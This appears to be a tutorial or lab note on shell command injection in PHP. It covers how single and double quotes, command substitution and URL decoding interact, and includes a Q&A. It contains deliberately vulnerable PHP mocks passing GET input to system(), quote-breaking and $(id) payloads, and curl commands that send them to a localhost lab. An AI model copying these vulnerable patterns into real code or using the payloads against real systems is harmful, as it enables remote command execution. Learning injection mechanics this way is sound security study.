# Quote Parsing

## Goal

Understand:

- single quote vs double quote
- shell parser state changes
- quote boundary breaking
- command substitution inside quotes
- variable expansion
- URL decoding vs shell interpretation
- execution vs observable output

---

# Environment

## PHP Mock 1 — single quote

```php
<?php
$ip = $_GET["ip"];

$cmd = "echo START; ping -c 1 '$ip'; echo END";
echo "CMD: $cmd\n";
system($cmd);
?>
````

---

## PHP Mock 2 — double quote

```php
<?php
$ip = $_GET["ip"];

$cmd = "echo START; ping -c 1 \"$ip\"; echo END";
echo "CMD: $cmd\n";
system($cmd);
?>
```

---

## PHP Mock 3 — hidden output

```php
<?php
$ip = $_GET["ip"];

$cmd = "echo START; ping -c 1 '$ip'; echo END";
echo "CMD: $cmd\n";

system("ping -c 1 \"$ip\" > /dev/null 2>&1");
?>
```

---

# Core Concepts

---

# 1. Single Quote Behavior

## Example

```sh
ping -c 1 'hello;id'
```

## Important

Inside single quote:

* `;`
* `&&`
* `$`
* `$( )`
* `` ` ``
* `|`

lose shell meaning.

Everything becomes literal string data.

---

# 2. Quote Boundary Breaking

## Input

```text
hello';id;'
```

## Final Command

```sh
ping -c 1 'hello';id;''
```

---

## Parser Flow

```text
single quoted string
→ quote terminated
→ shell syntax becomes active
→ id executed
→ trailing quote rebalanced
```

---

# 3. Why `;'` Exists

Without balancing:

```text
hello';id
```

can create broken quote state.

---

## Purpose

```text
;
→ terminate previous command

'
→ consume remaining server-side quote
```

Result:

```sh
''
```

(empty string token)

---

# 4. Double Quote Behavior

## Example

```sh
ping -c 1 "hello;id"
```

## Important

Inside double quote:

* `;`
* `&&`
* `|`

stay literal.

BUT:

* `$VAR`
* `${VAR}`
* `$(cmd)`
* `` `cmd` ``

still expand.

---

# 5. Command Substitution

## Example

```sh
"hello$(id)"
```

---

## Shell Behavior

```text
1. execute id
2. capture stdout
3. insert output into current argument
```

---

## Result

```sh
ping -c 1 "hellouid=1000(h)..."
```

---

# 6. Variable Expansion

## Example

```sh
"hello${USER}"
```

---

## Important

`${USER}`:

* reads existing variable
* DOES NOT execute new command

---

# Difference

## Variable Expansion

```sh
${USER}
```

→ variable read

---

## Command Substitution

```sh
$(id)
```

→ new command execution

---

# 7. URL Decoding vs Shell Parsing

## Raw HTTP

```text
hello%24%28id%29
```

---

## After URL Decode

```text
hello$(id)
```

---

## system()

```sh
ping -c 1 "hello$(id)"
```

---

## Shell Parse Stage

```text
$(id)
→ executed by shell
```

---

# Important

URL decoding and shell parsing are completely separate stages.

---

# 8. URL Parser vs Shell Parser

## Example

```text
hello&&id
```

---

## HTTP Layer

`&` can become query separator.

Result:

```text
ip=hello
```

---

## Encoded

```text
hello%26%26id
```

becomes:

```sh
"hello&&id"
```

inside shell.

But `&&` still stays string data because it is inside double quote.

---

# 9. Execution vs Output Visibility

## Example

```sh
> /dev/null 2>&1
```

---

## Important

This hides:

* stdout
* stderr

BUT command execution may still happen.

---

# Key Principle

```text
command execution
≠
observable output
```

---

# Key Patterns

---

## Pattern 1 — Quote State Controls Parsing

```sh
'...'
```

→ almost all shell syntax disabled

```sh
"..."
```

→ partial expansion survives

---

## Pattern 2 — Quote Breaking

```text
data state
→ quote termination
→ shell syntax state
→ command execution
```

---

## Pattern 3 — Expansion Inside Double Quote

Allowed:

```sh
$VAR
${VAR}
$(cmd)
`cmd`
```

---

## Pattern 4 — URL Decode Happens Before Shell Parse

```text
HTTP
→ URL decode
→ PHP string
→ system()
→ shell parse
```

---

## Pattern 5 — Command Substitution

```sh
$(cmd)
```

means:

```text
execute command
→ capture stdout
→ substitute into argument
```

---

## Pattern 6 — Variable Expansion != Command Execution

```sh
${USER}
```

≠

```sh
$(id)
```

---

# Useful curl Examples

## Single Quote Injection

```bash
curl 'http://localhost:8000/session03_1.php?ip=hello%27;id;%27'
```

---

## Double Quote Expansion

```bash
curl 'http://localhost:8000/session03_2.php?ip=hello$(id)'
```

---

## URL Encoded Command Substitution

```bash
curl 'http://localhost:8000/session03_2.php?ip=hello%24%28id%29'
```

---

## Encoded &&

```bash
curl 'http://localhost:8000/session03_2.php?ip=hello%26%26id'
```

---

# Mental Model

```text
input
→ HTTP parser
→ URL decode
→ PHP string
→ shell parser
→ expansion
→ execution
```

Never mix parser stages mentally.

# QA

**Q1.**
Why do `;`, `&&`, `|`, `$`, and `$(...)` lose their shell behavior inside single quotes?

<details>
<summary><strong>A1.</strong></summary>

Inside single quotes, almost all shell syntax becomes literal string data.
For example:

```sh
ping -c 1 'hello;id'
```

Here, `;` is an ordinary character rather than an operator.

</details>

---

**Q2.**
Why can input such as `hello';id;'` break the quote boundary?

<details>
<summary><strong>A2.</strong></summary>

The quote supplied by the input closes the server-opened single quote. The
parser then enters a state where:

```text
shell syntax becomes active
```

and `; id ;` is interpreted as active shell syntax.

</details>

---

**Q3.**
Why is rebalancing with a trailing `;'` or `''` necessary?

<details>
<summary><strong>A3.</strong></summary>

The complete command must remain syntactically balanced, including the quote
appended by the server. For example:

```text
hello';id;'
```

becomes:

```sh
ping -c 1 'hello';id;''
```

consumes the trailing quote without a syntax error.

</details>

---

**Q4.**
Why is `;` literal inside double quotes while `$(id)` can still execute?

<details>
<summary><strong>A4.</strong></summary>

Double quotes make command separators literal but still permit selected
expansions:

```text
; && |
```

remain literal, while:

```text
$VAR
${VAR}
$(cmd)
`cmd`
```

still expand.

</details>

---

**Q5.**
Why are `${USER}` and `$(id)` fundamentally different?

<details>
<summary><strong>A5.</strong></summary>

`${USER}` reads a variable, while `$(id)` starts a new command:

```sh
${USER}  -> variable expansion
$(id)    -> command substitution
```

</details>

---

**Q6.**
When does `hello%24%28id%29` become `hello$(id)`?

<details>
<summary><strong>A6.</strong></summary>

After URL decoding at the HTTP layer:

```text
HTTP raw
→ URL decode
→ PHP string
→ system()
→ shell parse
```

The encoded text is not shell syntax until decoding produces `$(id)` and the
server-side shell parses it.

</details>

---

**Q7.**
Why can decoded `hello&&id` remain literal text in the shell?

<details>
<summary><strong>A7.</strong></summary>

If `&&` remains inside double quotes, it is string data rather than a command
separator. Both the parser stage and:

```text
quote state
```

must be tracked.

</details>

---

**Q8.**
Why can `> /dev/null 2>&1` create the false impression that execution did not occur?

<details>
<summary><strong>A8.</strong></summary>

It is easy to confuse observable output with command execution:

```text
command execution
≠
observable output
```

The command may already have run even though stdout and stderr are hidden.

</details>
